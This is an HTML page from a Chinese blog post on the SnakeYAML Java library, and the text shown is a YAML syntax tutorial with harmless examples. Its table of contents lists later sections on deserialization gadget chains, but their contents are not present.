<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="SnakeYaml 链介绍SnakeYAML 是一个用于解析和生成 YAML 格式数据的库。YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化标准，常用于配置文件和数据交换。SnakeYAML 提供了一种简单的方式来将 YAML 文档转换为 Java 对象，反之亦然。 Yaml 基础YAML（YAML Ain’t Markup Language）是一种人类可">
<meta property="og:type" content="article">
<meta property="og:title" content="SnakeYaml 链">
<meta property="og:url" content="http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="SnakeYaml 链介绍SnakeYAML 是一个用于解析和生成 YAML 格式数据的库。YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化标准，常用于配置文件和数据交换。SnakeYAML 提供了一种简单的方式来将 YAML 文档转换为 Java 对象，反之亦然。 Yaml 基础YAML（YAML Ain’t Markup Language）是一种人类可">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714005311620.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714010237938.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714010531474.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714011241208.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714011848524.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714030158485.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714031036315.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714031012983.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714032329675.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714033322774.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714033249467.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714033821771.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714035048854.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240713233331321.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240713232632520.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240713233819941.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714143632407.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714151124540.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714151319527.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714160911569.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714161249195.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714161639661.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714164120687.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714164721780.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714164405745.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714170634643.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714221239211.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714221523179.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714221850975.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240714223951797.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240715015542586.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240715023036483.png">
<meta property="og:image" content="https://cmisl.github.io/images/image-20240715024001343.png">
<meta property="article:published_time" content="2024-07-13T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-10T06:04:54.376Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.github.io/images/image-20240714005311620.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>SnakeYaml 链</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/07/16/jdk7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/07/13/ROME%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&text=SnakeYaml 链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&is_video=false&description=SnakeYaml 链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SnakeYaml 链&body=Check out this article: http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&title=SnakeYaml 链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&name=SnakeYaml 链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/14/SnakeYaml%20%E9%93%BE/&t=SnakeYaml 链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SnakeYaml-%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">SnakeYaml 链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yaml-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">Yaml 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%A9%E8%BF%9B%E5%92%8C%E5%9D%97%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">缩进和块结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%92%8C%E5%88%AB%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">引用和别名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%96%87%E6%A1%A3%E6%94%AF%E6%8C%81"><span class="toc-number">1.2.4.</span> <span class="toc-text">多文档支持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%92%8C%E8%BD%AC%E4%B9%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">特殊字符和转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.2.6.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%9D%82%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.7.</span> <span class="toc-text">复杂结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.8.</span> <span class="toc-text">内置类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.9.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snakeYaml%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">snakeYaml序列化&#x2F;反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo%E6%BC%94%E7%A4%BA"><span class="toc-number">1.3.2.</span> <span class="toc-text">demo演示</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-Java-%E7%B1%BB"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">定义 Java 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">序列化和反序列化示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">运行示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#public%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">public相关问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">前置知识-SPI机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-connector-java%E4%B8%AD%E7%9A%84SPI"><span class="toc-number">1.4.2.</span> <span class="toc-text">mysql-connector-java中的SPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">snakeYaml反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-ScriptEngineManager-%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E5%88%A9%E7%94%A8-SPI-%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">基于 ScriptEngineManager 利用链（利用 SPI 机制）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payloda"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">payloda</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.5.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-JndiRefForwardingDataSource"><span class="toc-number">1.5.3.</span> <span class="toc-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-WrapperConnectionPoolDataSource"><span class="toc-number">1.5.4.</span> <span class="toc-text">C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">1.5.5.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-XBean"><span class="toc-number">1.5.6.</span> <span class="toc-text">Apache XBean</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-1"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Commons-Configuration"><span class="toc-number">1.5.7.</span> <span class="toc-text">Apache Commons Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-2"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        SnakeYaml 链
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-07-13T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-14</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="SnakeYaml-链"><a href="#SnakeYaml-链" class="headerlink" title="SnakeYaml 链"></a>SnakeYaml 链</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>SnakeYAML</code> 是一个用于解析和生成 YAML 格式数据的库。YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化标准，常用于配置文件和数据交换。<code>SnakeYAML</code> 提供了一种简单的方式来将 YAML 文档转换为 Java 对象，反之亦然。</p>
<h2 id="Yaml-基础"><a href="#Yaml-基础" class="headerlink" title="Yaml 基础"></a>Yaml 基础</h2><p>YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化标准，广泛用于配置文件、数据交换和文档结构。YAML 的设计目标是易于阅读和编写，同时也易于机器解析和生成。以下是 YAML 语法的一些关键点和详细说明：</p>
<h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ol>
<li><p><strong>标量（Scalars）</strong>：YAML 支持多种标量类型，包括字符串、整数、浮点数、布尔值等。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">string:</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"><span class="attr">integer:</span> <span class="number">42</span></span><br><span class="line"><span class="attr">float:</span> <span class="number">3.14</span></span><br><span class="line"><span class="attr">boolean:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">null_value:</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>列表（Lists）</strong>：列表用破折号（<code>-</code>）表示，每个元素占据一行。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fruits:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">apple</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">banana</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">orange</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>映射（Mappings）</strong>：映射用键值对表示，键和值之间用冒号（<code>:</code>）分隔。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">John</span> <span class="string">Doe</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">  <span class="attr">address:</span></span><br><span class="line">    <span class="attr">street:</span> <span class="number">123</span> <span class="string">Main</span> <span class="string">St</span></span><br><span class="line">    <span class="attr">city:</span> <span class="string">Anytown</span></span><br><span class="line">    <span class="attr">zip:</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="缩进和块结构"><a href="#缩进和块结构" class="headerlink" title="缩进和块结构"></a>缩进和块结构</h3><p>YAML 使用缩进来表示嵌套结构，通常使用两个空格进行缩进（不建议使用制表符）。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">John</span> <span class="string">Doe</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">  <span class="attr">address:</span></span><br><span class="line">    <span class="attr">street:</span> <span class="number">123</span> <span class="string">Main</span> <span class="string">St</span></span><br><span class="line">    <span class="attr">city:</span> <span class="string">Anytown</span></span><br><span class="line">    <span class="attr">zip:</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure>

<h3 id="引用和别名"><a href="#引用和别名" class="headerlink" title="引用和别名"></a>引用和别名</h3><p>YAML 支持引用和别名，允许重复使用之前定义的数据。</p>
<ol>
<li><strong>引用（Anchor）</strong>：用 <code>&amp;</code> 符号定义一个引用。</li>
<li><strong>别名（Alias）</strong>：用 <code>*</code> 符号引用一个引用。</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">base_config:</span> <span class="meta">&amp;base</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">log_level:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">extended_config:</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*base</span></span><br><span class="line">  <span class="attr">log_level:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<h3 id="多文档支持"><a href="#多文档支持" class="headerlink" title="多文档支持"></a>多文档支持</h3><p>YAML 支持在一个文件中包含多个文档，每个文档用三个破折号（<code>---</code>）分隔。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">document1:</span></span><br><span class="line">  <span class="attr">key1:</span> <span class="string">value1</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">document2:</span></span><br><span class="line">  <span class="attr">key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>

<h3 id="特殊字符和转义"><a href="#特殊字符和转义" class="headerlink" title="特殊字符和转义"></a>特殊字符和转义</h3><p>YAML 支持特殊字符和转义序列。例如，字符串中的特殊字符可以用反斜杠（<code>\</code>）进行转义。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">escaped_string:</span> <span class="string">&quot;This is a \&quot;quoted\&quot; string.&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>YAML 支持单行注释，用井号（<code>#</code>）表示。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is a comment</span></span><br><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>

<h3 id="复杂结构"><a href="#复杂结构" class="headerlink" title="复杂结构"></a>复杂结构</h3><p>YAML 可以表示复杂的嵌套结构，包括列表中的映射和映射中的列表。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">employees:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Alice</span></span><br><span class="line">    <span class="attr">role:</span> <span class="string">developer</span></span><br><span class="line">    <span class="attr">skills:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">java</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">python</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Bob</span></span><br><span class="line">    <span class="attr">role:</span> <span class="string">manager</span></span><br><span class="line">    <span class="attr">skills:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">leadership</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">communication</span></span><br></pre></td></tr></table></figure>

<h3 id="内置类型"><a href="#内置类型" class="headerlink" title="内置类型"></a>内置类型</h3><p>YAML 支持多种内置类型，包括日期和时间。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">date:</span> <span class="number">2023-01-01</span></span><br><span class="line"><span class="attr">datetime:</span> <span class="number">2023-01-01T12:00:00Z</span></span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以下是一个综合示例，展示了 YAML 的多种语法特性：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">John</span> <span class="string">Doe</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">  <span class="attr">address:</span></span><br><span class="line">    <span class="attr">street:</span> <span class="number">123</span> <span class="string">Main</span> <span class="string">St</span></span><br><span class="line">    <span class="attr">city:</span> <span class="string">Anytown</span></span><br><span class="line">    <span class="attr">zip:</span> <span class="number">12345</span></span><br><span class="line">  <span class="attr">hobbies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">reading</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hiking</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">coding</span></span><br><span class="line">  <span class="attr">preferences:</span> <span class="meta">&amp;prefs</span></span><br><span class="line">    <span class="attr">theme:</span> <span class="string">dark</span></span><br><span class="line">    <span class="attr">notifications:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_settings:</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*prefs</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">en</span></span><br></pre></td></tr></table></figure>

<p>通过这些详细的说明和示例，应该对 YAML 的语法有了全面的了解。YAML 的简洁性和可读性使其成为配置文件和数据交换的理想选择。</p>
